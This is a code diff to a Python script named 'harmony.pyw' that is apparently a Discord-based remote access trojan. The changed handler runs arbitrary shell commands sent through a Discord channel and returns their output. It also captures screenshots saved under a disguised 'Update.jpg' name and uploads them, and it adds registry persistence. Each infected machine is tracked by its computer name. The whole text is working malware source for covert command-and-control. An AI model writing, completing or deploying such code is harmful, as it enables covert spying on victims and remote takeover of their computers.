@@ -28,6 +28,7 @@ filename = 'harmony.pyw'
 
 webhook = discord.SyncWebhook.from_url(whURL)
 client = discord.Client(intents=intents)
+guild = client.get_guild(serverID)
 
 hwid = ''
 
@@ -36,7 +37,6 @@ async def on_ready():
     first_run = True
     global hwid
     
-    guild = client.get_guild(serverID)
     hwid = os.getenv("COMPUTERNAME")
    
     for category_name in guild.categories:
@@ -56,69 +56,71 @@ async def on_ready():
         
 @client.event
 async def on_message(msg):
-    if msg.channel.name == 'main':
-        prefix = b'Results of ' + msg.content.encode() + b' \n\n'
-        response = b''
-        
-        if msg.author == client.user:
-            return
-        
-        str_msg = msg.content.lower()
-        
-        try:
-            command = str_msg.split(" ", 1)[0]
-            args = str_msg.split(" ", 1)[1]
-        except IndexError:
-            pass
-            
-        if str_msg[0] == ">":
-            str_msg = str_msg[1:]
-            
-            if str_msg[0] == " ":
-                str_msg = str_msg[1:]
+    for category_name in guild.categories:
+        if hwid == str(category_name):
+            if msg.channel.name == 'main':
+                prefix = b'Results of ' + msg.content.encode() + b' \n\n'
+                response = b''
 
-            for line in runCommand(str_msg):
-                response += line
+                if msg.author == client.user:
+                    return
                 
-                if len(response) > 2000:
-                    t = response[2000:]
-                    response = response[:2000]
+                str_msg = msg.content.lower()
+
+                try:
+                    command = str_msg.split(" ", 1)[0]
+                    args = str_msg.split(" ", 1)[1]
+                except IndexError:
+                    pass
+                
+                if str_msg[0] == ">":
+                    str_msg = str_msg[1:]
+                    
+                    if str_msg[0] == " ":
+                        str_msg = str_msg[1:]
+
+                    for line in runCommand(str_msg):
+                        response += line
+                        
+                        if len(response) > 2000:
+                            t = response[2000:]
+                            response = response[:2000]
+                            
+                            await msg.channel.send(response.decode())
+                            
+                            if t:
+                                await msg.channel.send(t.decode())
+                            
+                            response = b''
+                            t = b''
+
+                    if response == b'':
+                        response = prefix + b'Invalid Command.'
+                        
+                    else:
+                        response = prefix + response
                     
                     await msg.channel.send(response.decode())
                     
-                    if t:
-                        await msg.channel.send(t.decode())
+                elif str_msg == "ss" or str_msg == "screenshot":
+                    s = getScreenshot()
                     
-                    response = b''
-                    t = b''
-
-            if response == b'':
-                response = prefix + b'Invalid Command.'
+                    if s:
+                        await msg.channel.send(file=discord.File("C:\\Users\\Public\\Downloads\\Update.jpg"))
+                        
+                        os.remove("C:\\Users\\Public\\Downloads\\Update.jpg")
+                        
+                    else:
+                        await msg.channel.send("Failed to take screenshot.")
                 
-            else:
-                response = prefix + response
-            
-            await msg.channel.send(response.decode())
-            
-        elif str_msg == "ss" or str_msg == "screenshot":
-            s = getScreenshot()
-            
-            if s:
-                await msg.channel.send(file=discord.File("C:\\Users\\Public\\Downloads\\Update.jpg"))
-                
-                os.remove("C:\\Users\\Public\\Downloads\\Update.jpg")
-                
-            else:
-                await msg.channel.send("Failed to take screenshot.")
-            
-        elif str_msg == "persistence" or str_msg == "pt":            
-            p = addPersistence()
-            result = "Failed to add persistence."
-            
-            if p:
-                result = "Successfully added persistence."
-                
-            await msg.channel.send(result)
+                elif str_msg == "persistence" or str_msg == "pt":            
+                    p = addPersistence()
+                    result = "Failed to add persistence."
+                    
+                    if p:
+                        result = "Successfully added persistence."
+                        
+                    await msg.channel.send(result)
         
 def addPersistence():
     s = addToRegistry()
